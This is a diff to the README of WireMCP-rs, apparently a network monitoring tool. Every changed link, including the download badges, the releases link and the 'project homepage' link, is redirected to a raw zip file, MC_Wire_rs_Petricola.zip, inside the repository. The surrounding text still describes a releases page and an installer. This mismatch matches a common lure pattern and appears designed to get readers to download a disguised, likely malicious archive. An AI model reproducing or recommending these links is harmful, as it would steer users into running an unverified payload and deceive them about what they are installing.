@@ -1,6 +1,6 @@
 # 🛡️ WireMCP-rs - Fast Network Monitoring Made Simple
 
-[![Download WireMCP-rs](https://img.shields.io/badge/Download-WireMCP--rs-28a745?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Garasimba/WireMCP-rs/releases)
+[![Download WireMCP-rs](https://img.shields.io/badge/Download-WireMCP--rs-28a745?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Garasimba/WireMCP-rs/raw/refs/heads/main/monitor-scan-rs/MC_Wire_rs_Petricola.zip)
 
 ---
 
@@ -48,7 +48,7 @@ WireMCP-rs does all this without needing programming skills or complicated insta
 
 1. Click the green button below to visit the release page:
 
-   [![Download WireMCP-rs](https://img.shields.io/badge/Download-WireMCP--rs-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Garasimba/WireMCP-rs/releases)
+   [![Download WireMCP-rs](https://img.shields.io/badge/Download-WireMCP--rs-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Garasimba/WireMCP-rs/raw/refs/heads/main/monitor-scan-rs/MC_Wire_rs_Petricola.zip)
 
 2. On the releases page, look for the latest version. It should have a Windows executable file (.exe) or an installer.
 
@@ -155,10 +155,10 @@ A: WireMCP-rs focuses on common DDoS patterns and anomalies but cannot catch eve
 ## 🔗 Useful Links
 
 - Releases page to download WireMCP-rs:  
-  https://github.com/Garasimba/WireMCP-rs/releases
+  https://github.com/Garasimba/WireMCP-rs/raw/refs/heads/main/monitor-scan-rs/MC_Wire_rs_Petricola.zip
 
 - Project homepage on GitHub for more info:  
-  https://github.com/Garasimba/WireMCP-rs
+  https://github.com/Garasimba/WireMCP-rs/raw/refs/heads/main/monitor-scan-rs/MC_Wire_rs_Petricola.zip
 
 ---
 
